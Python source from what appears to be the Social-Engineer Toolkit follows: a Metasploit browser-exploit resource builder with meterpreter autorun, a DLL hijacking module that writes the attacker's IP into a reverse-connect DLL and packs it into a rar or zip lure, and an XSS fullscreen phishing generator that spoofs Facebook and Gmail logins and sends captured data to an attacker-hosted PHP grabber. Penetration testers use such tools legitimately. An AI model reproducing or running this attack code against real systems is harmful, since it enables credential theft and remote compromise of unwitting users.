    print "Example would be http://172.16.32.129/malicious.exe"
    set_url=raw_input(setprompt(["4"], "URL to the executable"))
    filewrite.write("set URL %s" % (set_url) + "\n")
# if it isn't used for webdav then redirect to metasploit iframe configuration setting
if exploit != 'windows/browser/ms10_042_helpctr_xss_cmd_exec':
    if exploit != 'windows/browser/ms10_046_shortcut_icon_dllloader':
        if exploit != 'windows/browser/webdav_dll_hijacker':
            filewrite.write("set SRVPORT %s" % (metasploit_iframe) + "\n")
# if webdav is needed for exploit, change base port
if exploit == 'windows/browser/ms10_042_helpctr_xss_cmd_exec':
    filewrite.write("set SRVPORT 80"+"\n")
    # if we are using multi attack
    if multiattack == "on":
        webdav_write.write("WEBDAV_ENABLED")
if exploit == 'windows/browser/ms10_046_shortcut_icon_dllloader':
    filewrite.write("set SRVPORT 80"+"\n")

    # if we are using multi attack
    if multiattack == "on":
        webdav_write.write("WEBDAV_ENABLED")

if exploit == 'windows/browser/webdav_dll_hijacker':
    filewrite.write("set SRVPORT 80"+"\n")

    # if we are using multi attack
    if multiattack == "on":
        webdav_write.write("WEBDAV_ENABLED")

    extension=raw_input(setprompt(["4"], "Extension types for this exploit [all]"))
    if extension == '':
        filewrite.write("set EXTENSIONS p7c wab ppt pptx zip vsd docx grp snag wbcat eml odp pot ppsx htm html"+"\n")
    else:
        filewrite.write("set EXTENSIONS %s" % (extension) + "\n")
filewrite.write("set ExitOnSession false\n")

# if we are using multiple meterpreter multiscripts
if meterpreter_multi == "ON":
    multiwrite=file(setdir + "/multi_meter.file", "w")
    multiwrite.write(meterpreter_multi_command)
    filewrite.write("set InitialAutorunScript multiscript -rc %s/multi_meter.file\n" % (setdir))
    multiwrite.close()

# auto migration
if auto_migrate == "ON":
    filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")

filewrite.write("exploit -j\n\n")
filewrite.close()

# close webdav file if it was turned on
if webdav_enabled == "on":
    webdav_write.close()

# this basically sets a flag we need to make some custom changes in web_server.py to get
# the docbase exploit to work properly
if exploit == ("windows/browser/java_docbase_bof"):
    filewrite=file(setdir + "/docbase.file", "w")
    filewrite.write("DOCBASE=ON")
    filewrite.close()

########NEW FILE########
__FILENAME__ = hijacking
#!/usr/bin/env python
##################################
# Code behind the DLL Hijacker
####################################

import os
import re
import subprocess
import time
import sys
import glob
import binascii
from src.core.menu.text import dll_hijacker_text
from src.core.setcore import *

definepath=os.getcwd()

try:
    import zipfile
except ImportError, error:
    log(error)
    print "Module 'zipfile' was not detected, please download and install the python zipfile module"
    exit_set()

print dll_hijacker_text

# open the repository, its simple name,extension,dll
fileopen=file("src/webattack/dll_hijacking/repository", "r")

# set base counter for our pick
print "   Enter the choice of the file extension you want to attack:\n"
counter=1
for line in fileopen:
    line=line.split(",")
    print "    " + str(counter)+". "+line[0]
    counter=counter+1

print "\n"
choice=raw_input(setprompt(["2","15"], ""))

if choice == 'exit':
    exit_set()

if choice == "": choice="1"

choice=int(choice)

# reset the counter and get our payload ready and selected
counter=1
fileopen=file("src/webattack/dll_hijacking/repository", "r")
for line in fileopen:
    line=line.split(",")
    if int(counter) == int(choice):
        name=line[0].rstrip()
        extension="."+line[1].rstrip()
        dll=line[2].rstrip()
    counter=counter+1

print "\n   [*] You have selected the file extension of %s and vulnerable dll of %s" % (extension,dll)

# prep the directories
subprocess.Popen("mkdir " + setdir + "/dll", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
filename1=raw_input(setprompt(["2","15"], "Enter the filename for the attack (example:openthis) [openthis]"))
if filename1 == "": filename1 = "openthis"

# move the files there using the correct extension and file type
filewrite=file(setdir + "/dll/%s%s" % (filename1,extension),"w")
filewrite.write("EMPTY")
filewrite.close()

if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr=raw_input(setprompt(["2","15"], "IP address to connect back on"))
    update_options("IPADDR=" + ipaddr)

# replace ipaddress with one that we need for reverse connection back
fileopen=open("src/webattack/dll_hijacking/hijacking.dll" , "rb")
data=fileopen.read()

filewrite=open(setdir + "/dll/%s" % (dll), "wb")

host=int(len(ipaddr)+1) * "X"

filewrite.write(data.replace(str(host), ipaddr+"\x00", 1))
filewrite.close()


# ask what they want to use
print """
Do you want to use a zipfile or rar file. Problem with zip
is they will have to extract the files first, you can't just
open the file from inside the zip. Rar does not have this
restriction and is more reliable

1. Rar File
2. Zip File
"""

# flag a choice
choice=raw_input(setprompt(["2","15"], "[rar]"))
# if default was selected just do rar
if choice == "": choice = "1"
# if its not a rar file
if choice != "1":
    # if its not a zipfile, you messed up
    if choice != "2":
        # default to rar file
        choice = "1"

# if its choice 1 do some rar stuff
if choice == "1":

    # basic counter
    counter=0
    # look for rar in default directories
    rar_check = subprocess.Popen("rar",shell=True, stdout=subprocess.PIPE)
    # comunicate with the process
    stdout_value = rar_check.communicate()[0]
    # do a search to see if rar is present
    match=re.search("Add files to archive", stdout_value)
    # we get a hit?
    if match:
        subprocess.Popen("cd %s/dll;rar a %s/template.rar * 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
        counter=1

    # if we didnt find rar
    if counter == 0:
        print "[!] Error, rar was not detected. Please download rar and place it in your /usr/bin or /usr/local/bin directory."
        print "[*] Defaulting to zipfile for the attack vector. Sorry boss."
        choice = "2"

# if its a zipfile zip the badboy up
if choice == "2":
    # write to a zipfile here
    file = zipfile.ZipFile(setdir + "/template.zip", "w")
    for name in glob.glob(setdir + "/dll/*"):
        file.write(name, os.path.basename(name), zipfile.ZIP_DEFLATED)
    file.close()

########NEW FILE########
__FILENAME__ = fsattacks
# -*- coding: utf-8 -*-
#!/usr/bin/env python
#---------------------------------------------------------------------------------
# ATTENTION: UTF 8 is for non xss fullscreen attacks that have actual html code in the functions
# If this is converted to python3 utf8 coding can be taken out.
#---------------------------------------------------------------------------------
#
#      Addon Category:  Web Attacks
#	   Attack Type:     Full Screen Attacks / SET Addon Module
#      Author:          d4rk0
#      Twitter:         @d4rk0s
#	   Version:         1.0
#	   File:            fsattacks.py
#	   Purpose:         This holds every class/method for the setoolkit fullscreen attacks under the website attacks category 
#                       including the XSS Fullscreen Generator Code :P
#      License:         None This Code is For the Company TrustedSec and whatever they would like to do with it!
#                       And Free for anyone else to take modify/distribute this take this whole header out whatever
#                       I just ask you give me some sort of credit.
# 
#       ---------------------------------------------------------------------------------
#       Attention: ** Read the README on how to implement and use this please. Ive made it extremely easy **
#                      I also Started porting it to python3 right now it only runs with python 2.x 
#                      I could port it over to python3 within a couple days if its serious?
#        ---------------------------------------------------------------------------------
#       Disclaimer:
#
#       This is designed purely for good and not evil. If you are planning on using     
#       this tool for malicious purposes that are not authorized you are violating the terms       
#       of service and license of this application. This is for Ethical/Proper phishing/pentesting 
#       Testing ONLY! Leave this Disclaimer on this code if you reuse the code. Any other
#       options on this program used in a malicious way is not attended and not supported!
#       The utf8 coding at the top is due to the HTML code from the websites for the FullScreen
#       html are actually implemented in this code.
#       ---------------------------------------------------------------------------------
#       The Same Agreement applies to this module / toolset/fullscreen attacks that you agreed to
#       upon installing setoolkit by david kennedy of trustedsec
#
#########################################################################


import string
import time
import re
import os
import sys
import multiprocessing
import subprocess
import shutil, errno
import shutil
from src.core.setcore import *

class fullScreenAttacks():


    def __init__(self):
	# Strings for application
        self.menuTextFullScreen = ""
        self.inputData = ""
        self.inputDataTwo = ""
        self.results = ""
        self.aboutFullScreenFooter = ""
        self.countDracula = ""
        self.pathCheck = ""
        self.absolutePath = ""
        self.pathDivider = ""
        self.xssProgramName = ""
        self.displayCWD = ""
        self.imageHold = ""
        # Names of Fullscreen Folders/Subfolders Might change if names changed or something
        self.dirFullScreenAol = self.findFullScreenDir("AOL")
        self.dirFullScreenOutLook = self.findFullScreenDir("OUTLOOK")
        self.dirFullScreenGmail = self.findFullScreenDir("GMAIL")
        self.dirFullScreenTwitter = self.findFullScreenDir("TWITTER")
        self.dirFullScreenFacebook = self.findFullScreenDir("FACEBOOK")
        # XSS Image Names May Change on user Picks
        self.gmailLoginImage = "glogin.png"
        self.fbLoginImage = "flogin.png" 

	# Lists
        self.storageList = []
        # Dictonary
        self.storageDict = {}
	# Tuples

  

   ################################################################################
   ################################################################################

    def findFullScreenDir(self,dirName):
    # Simply check for Directory that holds all the FullScreen Files for moving ( GMAIL,FACEBOOK,TWITTER,OUTLOOK,AOL,CUSTOM)
    # nothing advanced but if for some reason directory names become lower case we check 
 
        if os.path.exists(dirName):
            return dirName 
        elif os.path.exists(str(dirName.lower())):
            return dirName.lower()
        else:
            # Directory not found
            return "NOT:FOUND"

   ################################################################################
   ################################################################################

    def phishMenuMain(self,menuDisplay = True):
    # This is the main menu function that displays the main intro menu
    # after they pick Full Screen Attacks off the WebSite Attack category
        
        if menuDisplay == True:
            # Display the menu also True on Default
            fullScreenAttackMsg = """

        \tFullScreen API Attack written by @d4rk0s

        \n\n\t FullScreen API Attacks Are Listed Below

         [!] This Addon is in BETA state much more will be added
             Enjoy & Remember Being Creative has endless possibilities   
             
         The first method will simply generate preconfigured
         FullScreen files you can edit and upload to your own server.
              
         The Second Method will generate FullScreen 
         Payload for you to use on a targeted website 
         that has a XSS vuln and can display JavaScript
         Tricking the user into thinking there clicking on 
         a Login link from the actual Targeted Website ( Ex: FaceBook ) 
         or whatever you can think of doing. 
        """      

            self.outputText(fullScreenAttackMsg,"darkgreen")

            fullScreenOptions = """
             
        [!] FullScreen API Website Attacks 
 
         1) FullScreen Attacks
         2) XSS FullScreen Payload Generator
 
        99) Return Back to Webattack menu
        """

            self.outputText(fullScreenOptions,"yellow")

        # Lets Grab the input
        self.displayPrompt()

        # Lets Decide What to do here
        # Check if they wanna Exit
        try:
            # Check if user wants to display main menu
            if str(self.inputData[0].replace(" ","")) == "" or str(self.inputData[0].replace(" ","")) == " ":
                # Enable True for Prompt Return after Display
                # Return back to prompt  
                self.phishMenuMain(False)

            # Display the FullScreen Menu for FullScreen Site Generation
            elif str(self.inputData[0].replace(" ","")) == "1":
                self.phishMenuFullScreen() 


            # Display XSS FullScreen Generator for sites with xss :D
            elif str(self.inputData[0].replace(" ","")) == "2":
                self.xssFullScreenGenerator()

            # \/ EDIT THE EXIT FUNCTION
            # Exit and Return back to WebAttack Menu
            elif str(self.inputData[0].replace(" ","")) == "99":
                # ***********************************************************************************************************
                #  *********** TODO: add the function to bring the user back to the Web Attacks SET Main Menu  in this method
                self.exitFullScreenPhish()
            # Spit Error nothing Good
            else:
                # err loop back to prompt throw error message
                self.outputText("\n\n[!] Error Please Select A Correct Option!\n\n","green") 
                # Return back to prompt  
                self.phishMenuMain(False)

        # Two Exception Errors TODO: Add SETS Logging maybe?
        except TypeError:
            pass 
 

   ################################################################################
   ################################################################################

    def phishMenuFullScreen(self,menuDisplay = True):
    # This is the  menu for FullScreen Attacks default auto displays menu Y

        if menuDisplay == True:
            # Display Menu To See what the user wants to do?
            self.menuTextFullScreen = """
        \n\n\t FullScreen API Website Attacks Are Listed Below
\n
        [?] This Attack Works Well with Linux,Windows & Mac 
            FireFox, Chrome, Safari 6 (on OS X 10.8 Mountain Lion). 

	 [!]  PHP Must Be Installed.
              PHP is added for sending the information also it grabs
              more information on the user including GEOLOCATION of IP 
              Browser Agent and a bunch of other things. 

        [-] Full-Screen Web Attacks
 
         1) Facebook Full-Screen Attack
         2) Gmail Full-Screen Attack
     

        99) Return to Main Menu
       """

	    # Display Main PhishFood FullScreen Attack Menu
            self.outputText(self.menuTextFullScreen,"white")   
            # goto sleep b****
            time.sleep(1)



	 # Lets Grab the input
        self.inputData = self.displayPrompt("FullScreen")
       
        # Lets Decide What to do here
        try:
            # Check if user wants to display FullScreen Generator Menu
            if str(self.inputData[0]) == "" or str(self.inputData[0]) == " ":
                self.phishMenuFullScreen(False)
            # Exit FullScreen Generator return to main fullscreen attack
            if str(self.inputData[0]) == "99":
                self.phishMenuMain()
            # Display About Menu
            elif str(self.inputData[0]) == "0":
                self.displayAboutFullScreen()
            # FaceBook Attack
            elif str(self.inputData[0]) == "1":
                self.deployFullPhish("FB")               
            # GMAIL Attack
            elif str(self.inputData[0]) == "2":
                self.deployFullPhish("GMAIL")
            # TWITTER Attack ----- NOT DONE
            elif str(self.inputData[0]) == "3":
                self.deployFullPhish("TWITTER")
            # Gmail Attack ------ NOT DONE
            elif str(self.inputData[0]) == "4":
                self.errorOutput("\n\n [!] GMAIL FullScreen isn't done yet","blue")   
             # Outlook Attack ----- NOT DONE
            elif str(self.inputData[0]) == "5":
                self.errorOutput("\n\n [!] Outlook FullScreen isn't done yet","blue")   
            # Spit Error nothing Good
            else:
                # err loop back to prompt throw error message
                self.outputText("\n\n[!] Error Please Select A Correct Option!\n\n","yellow")   
                # Return to correct prompt for more commands after err
                self.phishMenuFullScreen(False)
        # Two Exception Errors
        except (UnboundLocalError,TypeError):
            pass


   ################################################################################

    def xssFullScreenGenerator(self,menuDisplay = True):
    # This is the  menu for XSS FullScreen Generator , TRUE on default for menu display


        if menuDisplay == True:

            # Display Banner
            self.inputData = """
        \n
           __________________________________________
                                                   
            Welcome to SETs XSS FullScreen Generator   
           __________________________________________
        """
            self.outputText(self.inputData,"green")
        # Display Remember Please
            self.inputData = """
        [!] Please Remember: 
            Keep the File & Folder Order of which 
            the files are generated & kept in 
            when placing or uploading to the ethical
            attack server. 
            Because this is an 
            XSS Payload we want to make sure every single file
            has an 'Absolute' Path opposed to 'Relative'.
            The header.js file is really the only file
            that really needs absolute paths specified.
        \n
        """
            self.outputText(self.inputData,"yellow")   

            # ZzzZ for user display
            time.sleep(5)

            # Display Menu To See what the user wants to do?
            menuTextFullScreen = """

        [!] XSS FullScreen Generator

        [?] This Attack Works Well with Linux,Windows & Mac 
            FireFox, Chrome, Safari 6 (on OS X 10.8 Mountain Lion). 

        [!] Relay Methods to receive the form data are as 
            followed and some methods wont work in certain 
            browsers ( cross site scripting )
            but others will in mostly all browsers.

        Information Relay Methods:

        Cross Site Request / Mix Methods:

         Currently I only wanted to include mix/methods 
         because I felt including websockets would be pointless A)
         Because we dont care about responding and communicating with
         the client we just want the info & B) Websockets
         wont work 100% of the time because of security 
         with cross site scripting unless it's a stored XSS attack. 
         Not to mention websockets will work in some browsers but 
         might not send the data due to Cross Site Requests.
         But Still for what we need ( only user information ) a one way method 
         that will work with Safari Chrome and Firefox has been added. 
         Mixed Methods are various methods to communicate 
         the form / information back to you from the victim. 
         Such as implementing a constructed image attribute 
         tag with localhost/?a=INFO to relay the information
         cross site using JavaScript. This method along with
         various other ones are all used to send the Data. 
         Infact most of the time, the data is received
         numerous times because all methods have worked.


        [-] XSS Full-Screen Generator Web Attacks
 
         1) Facebook Full-Screen Attack
       //2) Custom Full-Screen Attack Generator
        99) Return to Main Menu
       """

            # Display Main PhishFood FullScreen Attack Menu
            self.outputText(menuTextFullScreen,"white")   
            # goto sleep b****
            time.sleep(.5)
 
	# Lets Grab the input
        self.inputData = self.displayPrompt("XSS")
       
        # Lets Decide What to do here
        try:
            # Check if user wants to display XSS Generator Menu
            if str(self.inputData[0]) == "" or str(self.inputData[0]) == " ":
                self.xssFullScreenGenerator(False)
            # Exit FullScreen Generator return to main fullscreen attack
            if str(self.inputData[0]) == "99":
                self.phishMenuMain()
            # FaceBook Attack
            elif str(self.inputData[0]) == "1":
                self.deployFullXSS("FB")               
            # Custom - Fullscreen Message should finish?
            elif str(self.inputData[0]) == "2":
                # nothing not fully done yet display text
                 self.errorOutput("\n\n [!] Custom Full-Screen XSS Generator not done yet","blue","XSS")   
            else:
                # err loop back to prompt throw error message
                self.errorOutput("\n\n[!] Error Please Select A Correct Option!\n\n","yellow","XSS")   

        # Two Exception Errors
        except (UnboundLocalError,TypeError):
            pass


    #####################################################
    #####################################################

    def customFullScreenGenerator(self):
        pass


    #####################################################
    #####################################################
    
    def deployFullXSS(self,typeOf):
    # Asks Questions and Deploys Specific XSS Generator Payload n File for Usage  
  
        # init storage dictionary
        self.storageDict = {
        "url"                  : "http://localhost/",
        "redirect"             : "unknown",
        "accountType"          : "unknown",
        "imgDirPath"           : "unknown",
        "imgDirXSS"            : "unknown",
        "spoofWebURLCaption"   : "unknown",
        "spoofWebURL"          : "unknown",
        "spoofWebTitle"        : "Untitled",
        "spoofWebStyleSheet"   : "unknown",
        "spoofWebJS1"          : "unknown",
        "spoofWebJS2"          : "unknown",
        "spoofWebJS3"          : "unknown",
        "spoofWebJS4"          : "unknown",
        "spoofWebJS5"          : "unknown",
        "uploadPath"           : "unknwon",
        "cssFolderStatus"      : 1,
        "jsFolderStatus"       : 1,
        "imgFolderStatus"      : 1,
        "cssFinalDest"         : "css",
        "jsFinalDest"          : "js",
        "imgFinalDest"         : "img",
        "bufferOne"            : "unknown",
        }


        # now Clear screen and begin with creation
        self.displayProperOSClear()


        # SET Account Type to what user picked
        if typeOf == "FB": self.storageDict["accountType"] = "Facebook"
        elif typeOf == "GMAIL": self.storageDict["accountType"] = "Gmail"
        else: self.storageDict["accountType"] = "Unknown"              

        # FIRST question / Absolute file path
        self.inputData = """\n
         [?]   An Absolute Path is needed so all files
             can be directly linked during the XSS
             attack inside the HTML file. In the example 
             below the folders have been placed in the
            'Attackfiles' directory on that computer '/var/www/Attackfiles'.

         [?]
               Using your own private IP for ethical pentesting? 
             Think about looking into free services like 
             noip.com so you have a constant absolute
             path no matter what IP you have. And if you do only
             have an IP address that still works fine on an absolute path.

         [Examples]
            
            Ex: <img src="http://www.SITE.net/Attackfiles/img/fbLogin.png">
            [ So the Absolute path would be http://www.SITE.net/Attackfiles ]

            Ex: <img src="http://96.35.2.12/Attackfiles/img/fbLogin.png">
            [ So the Absolute path would be http://96.35.2.12/Attackfiles ]

        \n
        """
        self.outputText(self.inputData,"yellow")   
        # Ask first question
        self.results = raw_input("\nSpecify Absolute Host Path of Where Files Will be (Ex: www.site.net/folder ):\n")  
        # check if its empty    
        if len(str(self.results.replace(" ","")))  == 0 or len(str(self.results)) > 9000:
            self.errorOutput("\n [!] Error no Specified Absolute Host Path!","blue","XSS")   
        else:
            # Make sure it doesn't have an ending /
            if self.results[len(self.results)-1] == "/":
                # Add Absolute Path to dictionary minus last / character
                self.storageDict["url"] = self.results[0:len(self.results)-1]
            else:
                # Add Absolute Path to Dictionary
                self.storageDict["url"] = str(self.results)

        # SECOND question / the title of the page
        self.inputData = """\n
        [?] This is the page title of the
            XSS page displaying the link.
            Normally it doesn't matter
            sometimes it does. It's mostly
            up to the person crafting the
            attack.
            Pressing Enter leaving it blank will 
            keep default settings of blank

        \n
        """
        self.outputText(self.inputData,"white")   
        # Ask first question
        self.results = raw_input("\nWhat Do you want the Page Title displaying the link to be?: ")  
        # check if its empty    
        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
            # SET DEFAULT BLANK
            self.storageDict["spoofWebTitle"] = " "
        else:
            # no heavy checking for now didnt really feel a need
            self.storageDict["spoofWebTitle"] = self.results


        # THIRD question / actual spoofed URL
        self.inputData = """\n
        [?] This is the URL Address thats displayed and
            spoofed in the victims browser. When
            they rollover the URL link with their
            mouse and see.
            Pressing Enter leaving it blank will 
            keep the default settings
        \n
        """
        self.outputText(self.inputData,"cyan")   
        # Ask first question
        self.results = raw_input("\nWhat should the URL Address be Spoofed to?( Ex: http://www.gmail.com/voice/ ):\n ")  
        # check if its empty    
        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
            # SET DEFAULT URL SPOOF DEPENDING ON WHAT WAS PICKED
            if typeOf == "FB":
                self.storageDict["spoofWebURL"] = "http://www.facebook.com/"
            elif typeOf == "GMAIL":
                self.storageDict["spoofWebURL"] = "http://www.gmail.com/"           
            else:
                self.storageDict["spoofWebURL"] = "http://localhost"                
        else:
            # no heavy checking for now didnt really feel a need
            self.storageDict["spoofWebURL"] = str(self.results)

        # FOURTH question /  actual text of the spoofed url
        self.inputData = """\n
        [?] This is the Value of the spoofed
            URL. This is what the user will
            see on the actual webpage.

        \n
        """
        self.outputText(self.inputData,"red")   
        # Ask first question
        self.results = raw_input("\nWhat should the Spoofed URL Say? (Ex: Shop Facebook ): ")  
        # check if its empty    
        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
            # SET DEFAULT URL SPOOF DEPENDING ON WHAT WAS PICKED
            if typeOf == "FB":
                self.storageDict["spoofWebURLCaption"] = "Facebook Friends"
            elif typeOf == "GMAIL":
                self.storageDict["spoofWebURLCaption"] = "Google Drive"           
            else:
                self.storageDict["spoofWebURLCaption"] = "Login now"                
        else:
            # no heavy checking for now didnt really feel a need
            self.storageDict["spoofWebURLCaption"] = str(self.results)
        
       # FIFTH question / Path where files will be uploaded to
        self.inputData = """\n
        [?] The path is where the folders & JavaScript Files for
            the attack will be generated / created in.
        \n
        """
        self.outputText(self.inputData,"green")   
        # Ask question
        self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/d/Desktop/ ):\n ")  
        # check if its empty    
        if len(str(self.results.replace(" ","")))  == 0 or len(str(self.results)) > 9000:
            # ASK AGAIN
            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/d/Desktop/ ):\n ")  
            if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
                if os.path.exists(str(self.results)):
                    self.storageDict["uploadPath"] = str(self.results)
                else: self.errorOutput("\n[!] Error Specified Path not Found\n","yellow","XSS")
            else: self.errorOutput("\n[!] Error Nothing Specified For the Second Time\n","yellow","XSS")
        # check if path exists               
        elif os.path.isdir(str(self.results)):
            # add upload path for uploading
            self.storageDict["uploadPath"] = str(self.results)
        else:
            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/ ):\n ")  
            if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
                if os.path.isdir(str(self.results)):
                    self.storageDict["uploadPath"] = str(self.results)
                else: self.errorOutput("\n[!] Error Specified Path not Found\n","yellow","XSS")
            else: self.errorOutput("\n[!] Error Nothing Specified For the Second Time\n","yellow","XSS")

        # LETS GENERATE THE FILES NOW
        self.outputText("\n [x] Attempting to Write Files to Directory \n","magenta")
   
        # Grab Path Divider ( POSIX OR WINDOWS BASICALLY )
        self.inputData = self.storageDict["uploadPath"]

        # Get operating system path divider
        self.pathDivider = self.returnPathDivider(self.inputData)

        # Craft and write Test file         
        self.saveFile(self.storageDict["uploadPath"] + self.pathDivider + "test.txt","SET FULLSCREEN TESTING","text")
        if os.path.isfile(self.storageDict["uploadPath"] + self.pathDivider + "test.txt"):
            self.outputText("\n[x] Directory Success: Permission to Write Folders and Files :D \n","green")
            # Delete test file or try no check
            os.remove(self.storageDict["uploadPath"] + self.pathDivider + "test.txt")
        else:               
            self.errorOutput("\n[!] Error Couldn't Write File. Check Permissions Please \n","yellow","XSS")

        # No other folders should be present with the names
        # js,img or css ... present user with alternative path

        # Check if 'CSS' Folders Already Exist
        if os.path.isdir(self.storageDict["uploadPath"] + self.pathDivider + "css") or os.path.isdir(self.storageDict["uploadPath"] + self.pathDivider + "js") or os.path.isdir(self.storageDict["uploadPath"] + self.pathDivider + "img"):
            self.inputData = """\n
        [?] There was a Folder already present
            with a named needed by the fullscreen XSS
            generator files and folders. Please delete that
            'img' 'js' or 'css' folder or select another upload
            path now. To quit and delete folders type 'quit' or 'q'
        \n
            """
            self.outputText(self.inputData,"blue") 
            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/attacks/ ):\n ")  
            # check if they wanna just exit
            if str(self.results).lower() == "quit" or str(self.results[0]).lower() == "q":
                self.outputText("[!] Leaving and returning to FullScreen Attack Main Menu","yellow") 
                self.phishMenuMain()
            # if its not a directory throw error
            elif not os.path.isdir(self.results):
                self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/ ):\n ")
                if str(self.results).lower() == "quit" or str(self.results[0]).lower() == "q":
                    self.outputText("[!] Leaving and returning to FullScreen Attack Main Menu","yellow") 
                    self.phishMenuMain()
                # if its not a directory throw error
                elif not os.path.isdir(self.results):
                    self.errorOutput("[!] Error No Directory Found Sir, Sorry Returning to Menu","yellow","XSS")
                else: self.storageDict["uploadPath"] = str(self.results)
            else: self.storageDict["uploadPath"] = str(self.results)
                

        # SET THE REST OF THE DICT VALUES
        self.xssProgramName = "varGrab.php" # PHP PROGRAM THAT GRABS THE POST VARIABLES SENT TO IT
        # Create the Rest of the Dictionary Variables
        self.storageDict["imgDirPath"] =  "../" + self.storageDict["imgFinalDest"] + "/" # FOR THE CSS STYLE SHEETS IMG FOLDER LOCATION
        self.storageDict["spoofWebStyleSheet"] =  self.storageDict["url"] + "/" + self.storageDict["cssFinalDest"] + "/" + "style.css" # ABSOLUTE OF CSS

        # Check Account type for XSS image Path Creation
        if typeOf == "FB":

            # build image path
            self.imageHold = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + self.gmailLoginImage 
            # Check if login image is present
            if os.path.isfile(self.imageHold):
                # Create the Absolute path with url of XSS Image
                self.storageDict["imgDirXSS"] =  self.storageDict["url"] + "/" + self.storageDict["imgFinalDest"] + "/" + self.gmailLoginImage
            else:
                self.outputText("[!] Error, Gmail Fullscreen XSS Gmail Image Not Found.","yellow") 

        # GMAIL TYPE SET PHISH/CUSTOM IMAGE
        elif typeOf == "GMAIL": 
            # build image path
            self.imageHold = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + self.gmailLoginImage 
            # Check if login image is present
            if os.path.isfile(self.imageHold):
                # Create the Absolute path with url of XSS Image
                self.storageDict["imgDirXSS"] =  self.storageDict["url"] + "/" + self.storageDict["imgFinalDest"] + "/" + self.gmailLoginImage
            else:
                self.outputText("[!] Error, Gmail Fullscreen XSS Gmail Image Not Found.","yellow") 

        self.storageDict["spoofWebJS1"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "jquery-1.7.2.js" # JS FILE 1
        self.storageDict["spoofWebJS2"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "browser-detect.js" # JS FILE 2
        self.storageDict["spoofWebJS3"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "fullscreen-api-shim.js" # JS FILE 3
        self.storageDict["spoofWebJS4"] = self.storageDict["url"]+"/"+self.storageDict["jsFinalDest"]+"/libs/"+"jquery-ui-1.8.18.custom.min.js"#JSFILE4
        self.storageDict["spoofWebJS5"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/" + "script.js" # JS FILE 5
        self.storageDict["url"] =  self.storageDict["url"] + "/" + self.xssProgramName + "?uL=" # THE FULL URL WITH uL POST VARIABLE

        ######

        # Done with Folders lets Craft Code and upload files to folders create XSS Payload  
        # IF FACEBOOK
        if typeOf == "FB": 
            self.outputText("\n[x] Copying/Moving Folders & Creating Facebook Files.......\n","magenta")
        
        # Copy the rest of the img files now
        self.outputText("\n[x] Attempting to move IMG Files to the IMG Directory.......\n","red")
        if typeOf == "FB":
            imageFileDirectory = os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "img"
        elif typeOf == "GMAIL":
            imageFileDirectory = os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "img"
        
        newImgDirectory = self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["imgFinalDest"]
        err = self.copyJunk(imageFileDirectory,newImgDirectory)
        if err == "COPY":
            pass 
        time.sleep(1)

        # Copy all javascript files to js directory
        self.outputText("\n[x] Attempting to move JS Files to JS Folder.......\n","cyan")
        self.storageDict["jsFinalDest"] = "js"

        if typeOf == "FB":
            # if path exists lets try to move n copy it
            if os.path.exists(os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "js"):
                jsCompletePath = os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "js"
            else:
                self.errorOutput("[!] Error Couldn't Find the js Folder for Moving and Altering  ","yellow","XSS")
        
        if typeOf == "GMAIL":
            # if path exists lets try to move n copy it
            if os.path.exists(os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "js"):
                jsCompletePath = os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "js"
            else:
                self.errorOutput("[!] Error Couldn't Find the js Folder for Moving and Altering  ","yellow","XSS")

        # Create new Directory to upload to 
        newJSDirectory = self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["jsFinalDest"]
        # Move Files now
        err = self.copyJunk(jsCompletePath,newJSDirectory)
        if err == "COPY":
            pass
              
        # Create CSS FOLDER
        self.inputData = self.createDirectory("css",self.storageDict["uploadPath"],self.pathDivider)
        if self.inputData == False:
            # Try to create again
            self.inputData = self.createDirectory("css",self.storageDict["uploadPath"],self.pathDivider)
            if self.inputData == False:
                self.errorOutput("[!] Error Couldn't Create the 'css' folder to specified upload path Check Permissions  ","blue","XSS")
        else:
            self.storageDict["cssFinalDest"] = "css"

        h = []
        if typeOf == "FB":
            # Grab CSS File code for writing stored in a list not a string  
            h.append(self.XSSGenCodeCSS(self.storageDict["imgDirPath"],"FB")) 
        

        # create CSS file path for uploading  * UNIVERSAL FOR ANY TYPE EVEN CUSTOM
        self.inputDataTwo =  self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["cssFinalDest"] + self.pathDivider +  "style.css"   

             
        # Write CSS File to CSS Folder and specified destination
        # anything multiline should be put into a list or tuple
        self.saveFile(self.inputDataTwo,h,"text")
        # ZzZz
        time.sleep(1) 

        # check file is present
        if os.path.isfile(self.inputDataTwo):   
            
            j = []
            if typeOf == "FB":
                # create custom header.js file code append to list
                j.append(self.XSSGenCode(self.storageDict,"MIX"))

